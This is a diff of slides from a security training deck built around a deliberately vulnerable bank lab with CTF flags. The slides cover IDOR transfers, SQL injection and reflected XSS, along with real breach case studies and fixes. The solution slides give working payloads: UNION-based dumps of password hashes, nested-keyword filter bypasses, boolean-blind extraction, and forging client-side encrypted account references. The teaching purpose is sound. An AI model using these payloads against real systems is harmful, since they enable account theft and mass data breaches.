-<section id="s69" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s70" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Identity &amp; Access Management</h3><p class="desc mt1" style="font-size:.9rem"><strong>IAM designs the authorisation model</strong> &mdash; who may act on which record. If that model only exists in a document, it does not exist.</p><p class="desc mt1" style="font-size:.9rem"><strong>Authentication is not authorisation.</strong> Logging someone in says who they are. It says nothing about whose account they may touch.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security &amp; Penetration Testing</h3><p class="desc mt1" style="font-size:.9rem"><strong>This is the single most common serious finding in banking applications</strong>, and the hardest to automate. A scanner does not know that account 4471 should not belong to this customer &mdash; only a tester with two accounts does.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Do we test every endpoint with two different customers, or only with one?&rdquo;</p>
 </div></section>
-<section id="s70" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s71" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><div><div class="sol-cwe">CWE-639 · A01:2021</div><h2 style="margin:.06em 0">IDOR — Transfer From Another Account</h2><div class="sol-where">&#128205; /transfer wizard (“From” account)</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Debit an account that <b>isn't yours</b>.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The “From” account is chosen by a value the <b>client sends</b> (<code>from_account_ref</code>), and the server debits it <b>without checking you own it</b>. Each level just wraps that reference in a fancier envelope — none of them add the missing ownership check.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw account number, no check</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">number + HMAC signature</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">client-side AES ciphertext</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">server scopes to WHERE user_id = you</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> the execute path scopes the source account — <code>WHERE id = :id AND user_id = :current_user</code>. Every forged number, signature or ciphertext simply matches no row.</p></div></div></div></div></section>
+<section id="s72" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Number + HMAC signature</h2><span class="sol-where" style="margin-left:auto">IDOR — Transfer From Another Account</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The form now submits the number <b>and</b> a signature — <code>from_account_sig = hmac(number)</code>. Editing only the number leaves the signature wrong, so it's rejected.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">You don't need to forge the HMAC — you just need a valid <b>pair</b>. The page leaks a signed number+sig pair in the Network request; reuse a leaked victim pair.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">from_account_ref=&lt;number&gt; &amp; from_account_sig=&lt;64-hex&gt;</div><div class="sol-paynote">replay a leaked valid pair</div></div></section>
+<section id="s73" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Client-side encryption</h2><span class="sol-where" style="margin-left:auto">IDOR — Transfer From Another Account</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">A page script encrypts your selection with <code>XferRef.encryptRef()</code> (AES) into <code>from_account_ref</code>. Editing the dropdown to a victim's number isn't on the page's own-account allowlist, so the ref posts empty.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">The encryption runs in the browser, so the <b>key is in the JS</b> (<code>/public/vendor/transfer-ref.js</code>). Mint ciphertext for any number from the console. <i>(The exposed key is intentional — that's the lesson: client-side crypto protects nothing.)</i></p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">XferRef.encryptRef('50100100000002')</div><div class="sol-paynote">paste the result into from_account_ref</div></div></section>
+<section id="s74" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">ICICI Bank, 2024 &mdash; 17,000 credit cards shown to the wrong people</h2>
 <div class="rw mt2">
@@ -1023,38 +1080,12 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">The same flaw, at scale &mdash; First American Financial, US</h3><p class="desc mt1" style="font-size:.88rem">A sequential number in a document URL exposed <strong>885 million</strong> files &mdash; bank account numbers, identity documents, mortgage and tax records going back to 2003 &mdash; with <strong>no login required</strong>. Regulators penalised the company; the technique required no skill at all.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> when our application decides <em>whose</em> record to show, is that decision made on the server from the session &mdash; or from something the client supplied?</p></div>
 </div></section>
-<section id="s71" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L1 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Move Money From an Account That Is Not Yours</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">Re-enabling the disabled field no longer works &mdash; the server now checks it. Find where the real ownership decision is made in the request, and change whose account the money leaves.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">Intercept the transfer request (DevTools &rarr; Network) and read every field it sends.<br/>The account identifier may travel somewhere other than the obvious dropdown.<br/>The server authenticated you. Test whether it ever checks the source account actually belongs to you.</p>
-</div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-
-</div>
-</div></section>
-<section id="s72" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><div><div class="sol-cwe">CWE-639 · A01:2021</div><h2 style="margin:.06em 0">IDOR — Transfer From Another Account</h2><div class="sol-where">&#128205; /transfer wizard (“From” account)</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Debit an account that <b>isn't yours</b>.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The “From” account is chosen by a value the <b>client sends</b> (<code>from_account_ref</code>), and the server debits it <b>without checking you own it</b>. Each level just wraps that reference in a fancier envelope — none of them add the missing ownership check.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw account number, no check</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">number + HMAC signature</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">client-side AES ciphertext</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">server scopes to WHERE user_id = you</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> the execute path scopes the source account — <code>WHERE id = :id AND user_id = :current_user</code>. Every forged number, signature or ciphertext simply matches no row.</p></div></div></div></div></section>
-<section id="s73" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Raw account number</h2><span class="sol-where" style="margin-left:auto">IDOR — Transfer From Another Account</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>from_account_ref</code> is simply the plain account number; the server debits whatever you send.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">In DevTools, edit the <code>&lt;select name="from_account_ref"&gt;</code> option to a victim's number and finish the wizard.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">from_account_ref = 50100100000002</div><div class="sol-paynote">their account is drained</div></div></section>
-<section id="s74" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Number + HMAC signature</h2><span class="sol-where" style="margin-left:auto">IDOR — Transfer From Another Account</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The form now submits the number <b>and</b> a signature — <code>from_account_sig = hmac(number)</code>. Editing only the number leaves the signature wrong, so it's rejected.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">You don't need to forge the HMAC — you just need a valid <b>pair</b>. The page leaks a signed number+sig pair in the Network request; reuse a leaked victim pair.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">from_account_ref=&lt;number&gt; &amp; from_account_sig=&lt;64-hex&gt;</div><div class="sol-paynote">replay a leaked valid pair</div></div></section>
-<section id="s75" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L1</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Client-side encryption</h2><span class="sol-where" style="margin-left:auto">IDOR — Transfer From Another Account</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">A page script encrypts your selection with <code>XferRef.encryptRef()</code> (AES) into <code>from_account_ref</code>. Editing the dropdown to a victim's number isn't on the page's own-account allowlist, so the ref posts empty.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">The encryption runs in the browser, so the <b>key is in the JS</b> (<code>/public/vendor/transfer-ref.js</code>). Mint ciphertext for any number from the console. <i>(The exposed key is intentional — that's the lesson: client-side crypto protects nothing.)</i></p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">XferRef.encryptRef('50100100000002')</div><div class="sol-paynote">paste the result into from_account_ref</div></div></section>
-<section id="s76" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s75" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 6</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; CWE-89 &bull; OWASP A03:2021</span></div>
 <h1>SQL Injection &mdash; Extract the Entire Database</h1>
 <p class="big mt2">&ldquo;The first injection let us in. This one empties the vault.&rdquo;</p>
 </div></section>
-<section id="s77" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s76" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Same Flaw. Completely Different Objective.</h3>
 <div class="vs mt2">
 <div>
@@ -1071,19 +1102,19 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <p class="desc mt3">The statements page runs a search. Whatever it finds, it renders into a table on screen. If an attacker can control the query, the page becomes a <strong style="color:var(--t1)">general-purpose data viewer</strong> for the entire database &mdash; using the bank&rsquo;s own formatting.</p>
 <div class="card yellow-left mt2"><p class="desc"><code>UNION SELECT</code> is the key: it bolts a second query onto the first, and the results arrive in the same table.</p></div>
 </div></section>
-<section id="s78" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s77" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">The Attack</h3>
 <div class="grid2 gap2">
 <div>
 <p class="sub mb1">What we type into the search box</p>
 <pre class="mt1"><code><span class="str">' UNION SELECT customer_id, name,
-   password_md5, email FROM users --</span></code></pre>
+   password_md5, email FROM users #</span></code></pre>
 <p class="sub mb1 mt2">What the server runs</p>
 <pre class="mt1"><code><span class="kw">SELECT</span> date, description, amount, balance
 <span class="kw">FROM</span> transactions
 <span class="kw">WHERE</span> narrative <span class="kw">LIKE</span> <span class="str">'%'</span><span class="vuln-hl"> UNION SELECT
   customer_id, name, password_md5, email
-  FROM users -- </span><span class="cm">%'</span></code></pre>
+  FROM users #</span><span class="cm">%'</span></code></pre>
 </div>
 <div>
 <p class="sub mb1">What appears on screen</p>
@@ -1100,12 +1131,43 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s79" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s78" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">Every customer. Every name. Every password hash.<br/>Rendered in the bank&rsquo;s own table, with the bank&rsquo;s own styling.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">This is the shape of almost every mass data breach you have read about.<br/>Not a dramatic break-in. A search box that answered the wrong question.</p>
 </div></section>
-<section id="s80" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s79" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; SQL injection (data extraction)</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">your search text, as part of the database query</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;If this database leaked tomorrow, is it stored so the dump is useless?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc"><strong>defence in depth</strong> &mdash; passwords hashed with salt &amp; pepper so a dump is not a takeover, least-privilege DB accounts, minimal functions/plugins, query monitoring</p></div>
+</div>
+</div></section>
+<section id="s80" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Read a Table You Were Never Shown</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You read data out of a table the application never meant to show you.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
+</div>
+</div>
+
+</div>
+</div></section>
+<section id="s81" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; Defence in Depth</h3>
 <div class="grid2 gap2">
 <div>
@@ -1125,12 +1187,18 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s81" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s82" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security</h3><p class="desc mt1" style="font-size:.9rem"><strong>The same rule as G1, applied everywhere.</strong> One parameterised login does not help if the search, the report and the export still concatenate. Coverage is the control, not the pattern.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Cyber Operations / SOC</h3><p class="desc mt1" style="font-size:.9rem"><strong>This is where detection earns its budget.</strong> One session reading 48,000 rows is an anomaly that should page a human. When prevention fails, this is the difference between an incident and a breach notification.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Infrastructure &amp; Data</h3><p class="desc mt1" style="font-size:.9rem"><strong>Least privilege on the database.</strong> If the web application&rsquo;s database account cannot read the credentials table, a successful injection returns nothing worth stealing.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Would we notice a single account reading our entire customer table &mdash; and in what timeframe?&rdquo;</p>
 </div></section>
-<section id="s82" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s83" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><div><div class="sol-cwe">CWE-89 · A03:2021</div><h2 style="margin:.06em 0">SQL Injection — Data Extraction</h2><div class="sol-where">&#128205; /statements — Remarks search box</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Read <b>another user's flag</b> out of the <code>ctf_flags</code> table.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">Only the search term is injectable — the date range is always bound. The term is spliced into a <code>LIKE</code> clause, so a crafted term stops being “text to match” and becomes SQL. Each level filters the term differently but still concatenates it.</p><div class="sol-note"><strong>Note.</strong> The flag is a per-user HMAC in <code>ctf_flags</code> (can't be shared) — extract <b>your own</b> row, read it from the results, submit it.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw → UNION / error-based</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">leaky single-pass filter → nest keywords</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">UNION looped-out + blind → one char at a time</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">bound parameter</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> the term is a <b>bound parameter</b> — <code>remarks LIKE :q</code>. It's matched as text, never parsed as SQL, at every level of cleverness.</p></div></div></div></div></section>
+<section id="s84" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Leaky single-pass blacklist</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Strips <code>union select -- # /* */</code> — but only <b>once</b>, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Hide the keyword inside itself so one removal rebuilds it.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags#</span>%'
+<span class="cmt">after one strip pass → ... UNION SELECT ... FROM ctf_flags#</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">UNIunionON  →  UNION     uni/**/on  →  union</div><div class="sol-paynote">then the same UNION / error-based dump</div></div></section>
+<section id="s85" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; UNION looped-out + blind</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>union</code> is stripped <b>repeatedly</b> until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' AND SUBSTRING((SELECT flag FROM ctf_flags
+   WHERE username='&lt;you&gt;'),1,1)='B'#</span>%'
+<span class="cmt">rows returned → 1st char is 'B'  ·  no rows → wrong guess  → reconstruct char by char</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='&lt;you&gt;'),1,1)='B'#</div><div class="sol-paynote">row present = guess correct</div></div></section>
+<section id="s86" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">MOVEit, 2023 &mdash; one SQL injection, thousands of victims</h2>
 <div class="rw mt2">
@@ -1140,43 +1208,12 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">Closer to home &mdash; India, October 2023</h3><p class="desc mt1" style="font-size:.88rem">A listing appeared offering the personal data of roughly <strong>815 million Indians</strong> &mdash; including identity and passport details &mdash; reportedly drawn from a national health research database. Investigated by CERT-In, it is among the largest exposures of personal data ever reported anywhere.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> which externally exposed third-party products hold our sensitive data &mdash; and how fast could we answer that question when tomorrow&rsquo;s advisory lands?</p></div>
 </div></section>
-<section id="s83" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Read a Table You Were Never Shown</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">The statements search is injectable. At this level a naive UNION is blocked by a filter. Adapt the injection to pull a column from another table into the results on screen.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">First find how many columns the original query returns &mdash; UNION needs a match.<br/>The filter may block spaces or keywords. There is always more than one way to write the same SQL.<br/>Start by extracting the database or table names, then go after the rows.</p>
-</div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-
-</div>
-</div></section>
-<section id="s84" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><div><div class="sol-cwe">CWE-89 · A03:2021</div><h2 style="margin:.06em 0">SQL Injection — Data Extraction</h2><div class="sol-where">&#128205; /statements — Remarks search box</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Read <b>another user's flag</b> out of the <code>ctf_flags</code> table.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">Only the search term is injectable — the date range is always bound. The term is spliced into a <code>LIKE</code> clause, so a crafted term stops being “text to match” and becomes SQL. Each level filters the term differently but still concatenates it.</p><div class="sol-note"><strong>Note.</strong> The flag is a per-user HMAC in <code>ctf_flags</code> (can't be shared) — extract <b>your own</b> row, read it from the results, submit it.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw → UNION / error-based</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">leaky single-pass filter → nest keywords</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">UNION looped-out + blind → one char at a time</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">bound parameter</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> the term is a <b>bound parameter</b> — <code>remarks LIKE :q</code>. It's matched as text, never parsed as SQL, at every level of cleverness.</p></div></div></div></div></section>
-<section id="s85" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Raw — in-band UNION / error-based</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The term is used exactly as typed, and raw SQL errors are shown. The result grid has 7 columns.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Close the string, then <code>UNION</code> a select from <code>ctf_flags</code> (flag lands in the Remarks cell) — or leak it through an error.</p></div></div><pre class="sol-code">... WHERE (from_account_id=:a1 OR to_account_id=:a2)
-    AND remarks LIKE '%<span class="inj">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags-- </span>%'
-<span class="cmt">your UNION row joins the result set → another user's flag in the grid</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags-- </div><div class="sol-paynote">flag shows in the Remarks column</div></div></section>
-<section id="s86" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Leaky single-pass blacklist</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Strips <code>union select -- # /* */</code> — but only <b>once</b>, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Hide the keyword inside itself so one removal rebuilds it.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags-- </span>%'
-<span class="cmt">after one strip pass → ... UNION SELECT ... FROM ctf_flags-- </span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">UNIunionON  →  UNION     uni/**/on  →  union</div><div class="sol-paynote">then the same UNION / error-based dump</div></div></section>
-<section id="s87" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; UNION looped-out + blind</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>union</code> is stripped <b>repeatedly</b> until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' AND SUBSTRING((SELECT flag FROM ctf_flags
-   WHERE username='&lt;you&gt;'),1,1)='B'-- </span>%'
-<span class="cmt">rows returned → 1st char is 'B'  ·  no rows → wrong guess  → reconstruct char by char</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='&lt;you&gt;'),1,1)='B'-- </div><div class="sol-paynote">row present = guess correct</div></div></section>
-<section id="s88" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s87" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 7</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; CWE-79 &bull; OWASP A03:2021</span></div>
 <h1>Reflected XSS &mdash; Turn the Bank&rsquo;s Page Against Its Own Customer</h1>
 <p class="big mt2">&ldquo;Every attack so far targeted the bank. This one targets <em>you</em>.&rdquo;</p>
 </div></section>
-<section id="s89" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s88" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">The Page Repeats What You Said</h3>
 <p class="desc mb2">Search for something that does not exist and the bank is helpful about it:</p>
 <div class="urlbar mt2"><span style="color:var(--t3)">https://bank.example/statements?q=</span><span style="color:#9ece6a">groceries</span></div>
@@ -1185,7 +1222,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <pre class="mt2"><code><span class="cm">// statements.php — the echo heard round the world</span>
 <span class="kw">echo</span> <span class="str">"&lt;p&gt;No results found for &lt;b&gt;"</span> . <span class="vuln-hl">$_GET['q']</span> . <span class="str">"&lt;/b&gt;&lt;/p&gt;"</span>;</code></pre>
 </div></section>
-<section id="s90" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s89" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">The Attack &mdash; A Link, Not a Break-In</h3>
 <div class="grid2 gap2">
 <div>
@@ -1206,12 +1243,43 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s91" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s90" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">&ldquo;Check your phishing awareness training&rdquo; does not help here.<br/>The link <em>was</em> the bank.</h1>
